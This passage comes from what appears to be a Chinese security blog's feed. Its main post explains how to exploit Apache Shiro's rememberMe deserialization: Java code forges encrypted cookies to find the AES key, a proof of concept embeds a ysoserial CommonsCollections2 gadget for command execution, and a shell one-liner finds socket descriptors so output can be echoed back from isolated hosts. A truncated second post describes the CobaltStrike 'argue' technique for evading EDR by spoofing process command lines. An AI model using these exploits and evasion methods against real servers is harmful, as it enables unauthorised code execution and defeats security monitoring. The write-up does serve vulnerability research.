src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978187385340.jpg" alt="-w1177"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188176420.jpg" alt="-w923"></p><p>之后进入org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.SubjectContext)</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188494866.jpg" alt="-w687"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188780907.jpg" alt="-w641"></p><p>最后调用org.apache.shiro.web.servlet.SimpleCookie#removeFrom方法添加 cookie <code>rememberMe=deleteMe</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978189943674.jpg" alt="-w910"></p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978190869603.jpg" alt="-w830"></p><h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2. 反序列化"></a>2. 反序列化</h3><p>主要利用正常解密后的反序列化利用，但反序列化的前提是要使用正确的 key 实现正常解密</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>从上面<strong>无效 rememberMe</strong>一节中我们还可以知道</p><ul><li>当 key 匹配且正常反序列化时，响应不会返回 rememberMe=delete</li><li>当 key 不匹配时，响应返回 rememberMe=delete</li></ul><p><strong>那么只要保证序列化对象的有效性，就可以通过上面的差异来实现匹配 Key</strong></p><p>因为序列化对象需要继承PrincipalCollection，所以我们主要关注SimplePrincipalMap、SimplePrincipalCollection</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978203984295.jpg" alt="-w850"></p><p>简单写个脚本用于生成 payload</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>PrincipalCollection<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>SimplePrincipalMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">generate</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SimplePrincipalMap simplePrincipalMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimplePrincipalMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>simplePrincipalMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><table><thead><tr><th>Key 匹配</th><th>Key 不匹配</th></tr></thead><tbody><tr><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978226467789.jpg" alt="-w828"></td><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978228045356.jpg" alt="-w829"></td></tr></tbody></table><h3 id="3-HTTPLog-or-DNSLog"><a href="#3-HTTPLog-or-DNSLog" class="headerlink" title="3. HTTPLog or DNSLog"></a>3. HTTPLog or DNSLog</h3><p>实际也是利用反序列化，只是简单的向外请求解析域名，但是很多人都喜欢用这个，所以单独列出来</p><p>XXXLog 平台如果提供有 API 就可以自动化检测，但毕竟此方法受太多客观因素影响，不建议</p><h2 id="IV-漏洞利用"><a href="#IV-漏洞利用" class="headerlink" title="IV. 漏洞利用"></a>IV. 漏洞利用</h2><p>我们刚才提到了，序列化对象需要继承PrincipalCollection，那么这是必要的么？如果能没有这层限制，是否能利用其他 gadget 进而实现 RCE</p><p>我们关注到org.apache.shiro.mgt.AbstractRememberMeManager#deserialize，这里最后调用的是org.apache.shiro.io.DefaultSerializer#deserialize进行反序列化，只是在 return 时会强制转化为PrincipalCollection类型对象</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978236110127.jpg" alt="-w601"></p><p>所以我们可以使用其他 gadget 执行攻击，例如 ysoserial 系列</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>CommonsCollections2<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>Object<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommonsCollections2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token string">"&lt;Exec Command>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="gadget-异常"><a href="#gadget-异常" class="headerlink" title="gadget 异常"></a>gadget 异常</h3><p>这里可能会有人提到，为什么很多 cc gadget 无法使用呢？简单跟一个 cc4，会发现报错提示找不到<code>org.apache.commons.collections4.Transformer</code>，而 shiro 1.2.4 默认使用的 commons-collections4-4.0.jar 理论上是可以的利用的，报错原因在哪里？</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979087078911.jpg" alt="-w1501"></p><p>我们回到反序列化最开始的地方org.apache.shiro.io.DefaultSerializer#deserialize，注意这里调用的是ClassResolvingObjectInputStream.readObject()</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979098205251.jpg" alt="-w699"></p><p>ClassResolvingObjectInputStream继承自ObjectInputStream但重写了 resolveClass，最大的不同在于加载方式</p><table><thead><tr><th>-</th><th align="center">ClassResolvingObjectInputStream</th><th align="center">ObjectInputStream</th></tr></thead><tbody><tr><td>代码</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979099399026.jpg" alt="-w724"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979099587009.jpg" alt="-w691"></td></tr><tr><td>加载</td><td align="center">ClassUtils.forName<br>实际 ClassLoader.loadClass</td><td align="center">Class.forName</td></tr><tr><td>代码</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979102998850.jpg" alt="-w918"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979106277660.jpg" alt="-w829"></td></tr></tbody></table><p>那么两种加载方式的区别是什么？这里可先详细阅读这篇文章：<a href="https://www.jianshu.com/p/83cbbd0b8b10" target="_blank" rel="noopener">ClassUtils详解</a></p><table><thead><tr><th align="center">-</th><th align="center">ClassLoader.loadClass</th><th align="center">Class.forName</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">获取指定的 classLoader</td><td align="center">自动获取 classLoader</td></tr><tr><td align="center">2</td><td align="center">只能将类加载到 JVM</td><td align="center">可加载到 JVM 并初始化<br>(ObjectInputStream中设置为 false 未初始化)</td></tr></tbody></table><p>还是没搞懂问题出自哪里，另网上有提及的一处区别（<strong>注意！有问题！</strong>）</p><blockquote><p>是否会解析数组类型<br>1）Class.forName会解析数组类型，如[Ljava.lang.String;<br>2）ClassLoader不会解析数组类型，加载时会抛出ClassNotFoundException;</p></blockquote><p>但是经测试WebAppClassLoader是有能力解析数组的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979768116938.jpg" alt="-w631"></p><p>最后发现关键点在于org.apache.catalina.loader.WebappClassLoaderBase#loadClass(java.lang.String, boolean)，在调用 Class.forName 时<strong>指定从父类向上搜寻</strong>，导致找不到<code>[Lorg.apache.commons.collections4.Transformer;</code>类</p><table><thead><tr><th align="center">参数</th><th align="center">parent</th><th align="center">this</th></tr></thead><tbody><tr><td align="center">ClassLoader</td><td align="center">URLClassLoader</td><td align="center">WebappClassLoader</td></tr><tr><td align="center">测试</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979885531644.jpg" alt="-w1260"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979885797767.jpg" alt="-w1260"></td></tr></tbody></table><p>关于WebappClassLoader与其他 ClassLoader 可详细阅读此篇文章：<a href="https://www.cnblogs.com/aspirant/p/8991830.html" target="_blank" rel="noopener">图解Tomcat类加载机制</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979903825787.jpg" alt></p><blockquote><ol><li>WebappClassLoader：各个Webapp私有的类加载器，加载路径中的class只对当前Webapp可见</li><li>tomcat 为了实现隔离性，没有遵守双亲委派这个约定，每个webappClassLoader加载自己的目录下的class文件，不会传递给父类加载器</li></ol></blockquote><p>而<code>commons-collections4-4.0.jar</code>位于 webapp 中项目 /WEB-INF/lib 下，在没有其他额外配置 CLASSPATH 的情况时，默认只有 WebappClassLoader 才能加载</p><p><strong>所以 Tomcat 为什么搜索指定父类开始？这个设计就很迷🤔🤔🤔</strong></p><h2 id="V-回显"><a href="#V-回显" class="headerlink" title="V. 回显"></a>V. 回显</h2><p>在遇到几次目标后，会发现有的设备是不出网的，哪怕碰撞出了 key 也不清楚是否正常执行了命令，这时候回显的能力就很重要</p><p>因为对回显没有研究，看了其他师傅的文章，按照<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">00theway师傅</a>讲的，目前公开的大概有以下几种方式获取结果：</p><ol><li>报错回显</li><li>web中获取当前上下文对象（response、context、writer等）</li><li>可以出网情况下OOB</li></ol><p>利用效果比较好的有以下两个，前者适用 Linux/Windows Tomcat，后者适用 Linux 各类场景，各有优势，按场景利用</p><ol><li>基于 Tomcat Response： <a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">https://koalr.me/post/shiro-lou-dong-jian-ce/</a></li><li>基于 Linux Socket： <a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">https://www.00theway.org/2020/01/17/java-god-s-eye/</a></li></ol><h3 id="1-Tomcat-Gadget"><a href="#1-Tomcat-Gadget" class="headerlink" title="1. Tomcat Gadget"></a>1. Tomcat Gadget</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981176541010.jpg" alt="-w1100"></p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>编译 java-object-searcher 为 jar，方便引用</p><pre class=" language-shell"><code class="language-shell">$> mvn clean package -Dmaven.test.skip=true</code></pre><p>拉取 Tomcat (非源码)，创建一个 Tomcat 项目，并自行创建一个 Servlet 用于断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981590274384.jpg" alt="-w1443"></p><p>测试 Tomcat 8.0.39 环境下实际只有一条 gadget</p><pre class=" language-plain"><code class="language-plain">TargetObject = {org.apache.tomcat.util.threads.TaskThread}   ---> group = {java.lang.ThreadGroup}    ---> threads = {class [Ljava.lang.Thread;}     ---> [5] = {java.lang.Thread}      ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}       ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}         ---> handler = {org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler}          ---> global = {org.apache.coyote.RequestGroupInfo}           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>}            ---> [0] = {org.apache.coyote.RequestInfo}             ---> req = {org.apache.coyote.Request}</code></pre><p>在这里又遇到了 cookie 过大的情况，解决方法请看这篇<a href="https://xz.aliyun.com/t/6227" target="_blank" rel="noopener">缩小ysoserial payload体积的几个方法</a></p><p>使用 javassist 加载目标类，导致体积过大</p><pre class=" language-java"><code class="language-java">pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CtClass clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981183428132.jpg" alt="-w676"></p><p>转变为使用 javassist 直接创建类</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981184068390.jpg" alt="-w656"></p><p>我这里只是实现 Demo，没有对各个 Tomcat 版本以及 CC gadget 做兼容，这位师傅实现对利用链更广泛的兼容：<a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">Shiro RememberMe 漏洞检测的探索之路</a></p><h3 id="2-Linux-Socket"><a href="#2-Linux-Socket" class="headerlink" title="2. Linux Socket"></a>2. Linux Socket</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15980718016937.jpg" alt="-w1145"></p><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>基于 Linux 万物皆文件的性质，对于每一个链接 socket 都有其对应的文件描述符，通过直接向文件描述符写入内容实现回显</p><p>有部分文章使用是<strong>尝试通过 IP、PORT 进行过滤获取 inode 值后，再获取 fd 写入</strong>，这个方法有一个很大的问题在于如果目标位于负载、代理之后的复杂网络，是没有办法筛选出有效的请求源，导致方法失败</p><p><strong>所以我采用通过获取所有有效 inode 值，再获取 fd 组，统一尝试写入，突破复杂网络，实现回显</strong>😈</p><p>首先了解下 /proc/self/net/tcp</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15980738788715.jpg" alt="-w722"></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/net/tcp_states.h</span><span class="token keyword">enum</span> <span class="token punctuation">{</span>    TCP_ESTABLISHED <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>    TCP_SYN_SENT<span class="token punctuation">,</span>    TCP_SYN_RECV<span class="token punctuation">,</span>    TCP_FIN_WAIT1<span class="token punctuation">,</span>    TCP_FIN_WAIT2<span class="token punctuation">,</span>    TCP_TIME_WAIT<span class="token punctuation">,</span>    TCP_CLOSE<span class="token punctuation">,</span>    TCP_CLOSE_WAIT<span class="token punctuation">,</span>    TCP_LAST_ACK<span class="token punctuation">,</span>    TCP_LISTEN<span class="token punctuation">,</span>    TCP_CLOSING<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">/* Now a valid state */</span>    TCP_NEW_SYN_RECV<span class="token punctuation">,</span>    TCP_MAX_STATES    <span class="token comment" spellcheck="true">/* Leave at the end! */</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>关注到 connection state 标志，通过判断是否为1就可以筛选正在传输的 socket 的 inode 值</p><p>之后通过筛选 /proc/self/fd 中 socket[<inode>] 对应文件描述符值，遍历尝试写入即可</inode></p><p>下面是我用来筛选的语句 Orz</p><pre class=" language-shell"><code class="language-shell">$ > inode=`cat /proc/net/tcp|tail -n +2|awk '{if($4=="01")print}'|awk '{print $10}'`;for i in $inode; do fd=`ls -l /proc/$PPID/fd|grep socket|grep $i|awk '{print $9}'`; if [ ${#fd} -gt 0 ]; then echo -n $fd-;fi;done;$ > 97-57-</code></pre><p>原本是想通过全部由 JAVA 原生代码实现，结果发现生成的 Payload 长度超出了 Cookie or Header Length 限制，除非另利用 gadget 去修改，否则会触发 ERROR 400，后面发现用 shell 直接过滤 fd  更方便快捷</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://xz.aliyun.com/t/6227#toc-4" target="_blank" rel="noopener">缩小ysoserial payload体积的几个方法</a></li><li><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">通杀漏洞利用回显方法-linux平台</a></li><li><a href="http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo" target="_blank" rel="noopener">半自动化挖掘request实现多种中间件回显</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一次遇到案例，利用部分工具无法有效实现执行、回显，于是有了此篇&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>深信服 EDR RCE 简析</title>
    <link href="https://blog.sari3l.com/posts/6712089c/"/>
    <id>https://blog.sari3l.com/posts/6712089c/</id>
    <published>2020-08-18T03:23:31.000Z</published>
    <updated>2020-08-26T06:40:20.190Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e6b3455a09d258c5b541c30a30c1ab04f6b7aa4f35923d5f7b4015e7361a84b2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike Argue 原理 - 翻译文</title>
    <link href="https://blog.sari3l.com/posts/c5e878c3/"/>
    <id>https://blog.sari3l.com/posts/c5e878c3/</id>
    <published>2020-08-04T09:26:01.000Z</published>
    <updated>2020-08-04T09:46:29.621Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965212817543.jpg" alt></p><p>看 youtube 视频介绍，此攻击原本是为了对抗 EDR 检测或延迟 AV 查杀的手段</p><p>原理很简单，通过设置CREATE_SUSPENDED挂起进程启动，再通过PEB修改ProcessParameters中实际将要执行的命令字符串，最后ResumeThread恢复进程 → 暗度陈仓</p><p>在实现时，延伸出来两个小问题(技巧)</p><ol><li>如何获取 PEB 并更新</li><li>绕过 PEB 副本检测</li></ol><h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h2><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>  LPCSTR                lpApplicationName<span class="token punctuation">,</span>  LPSTR                 lpCommandLine<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpProcessAttributes<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpThreadAttributes<span class="token punctuation">,</span>  BOOL                  bInheritHandles<span class="token punctuation">,</span>  DWORD                 dwCreationFlags<span class="token punctuation">,</span>  LPVOID                lpEnvironment<span class="token punctuation">,</span>  LPCSTR                lpCurrentDirectory<span class="token punctuation">,</span>  LPSTARTUPINFOA        lpStartupInfo<span class="token punctuation">,</span>  LPPROCESS_INFORMATION lpProcessInformation<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener">CreateProcessA</a>函数中我们关注到lpCommandLine和dwCreationFlags</p><ul><li>lpCommandLine：要执行的命令行 -&gt; 明面上要执行的命令行</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags" target="_blank" rel="noopener">dwCreationFlags</a>：流程创建标志</li></ul><p>在<code>流程创建标志</code>中多个标记使用<code>|(或)运算</code>叠加，有以下几个常数值需要关注</p><table><thead><tr><th>常数/值</th><th>描述</th></tr></thead><tbody><tr><td>CREATE_NEW_CONSOLE<br>0x00000010</td><td>新进程具有一个新的控制台，而不是继承其父级的控制台（默认）。有关更多信息，请参见创建控制台。<br>该标志不能与<strong>DETACHED_PROCESS</strong>一起使用。</td></tr><tr><td>CREATE_NO_WINDOW<br>0x08000000</td><td>该过程是一个没有控制台窗口即可运行的控制台应用程序。因此，未设置应用程序的控制台句柄。<br>如果该应用程序不是控制台应用程序，或者与<strong>CREATE_NEW_CONSOLE</strong>或<strong>DETACHED_PROCESS</strong>一起使用，则将忽略此标志。</td></tr><tr><td>CREATE_SUSPENDED<br>0x00000004</td><td>新进程的主线程在挂起状态下创建，并且直到调用<strong>ResumeThread</strong>函数才运行。</td></tr></tbody></table><p>以下试图创建一个进程并挂起，我们接下来将修改此进程</p><pre class=" language-cpp"><code class="language-cpp">STARTUPINFOA si<span class="token punctuation">;</span>PROCESS_INFORMATION pi<span class="token punctuation">;</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"cmd.exe"</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    FALSE<span class="token punctuation">,</span>    CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="PEB"><a href="#PEB" class="headerlink" 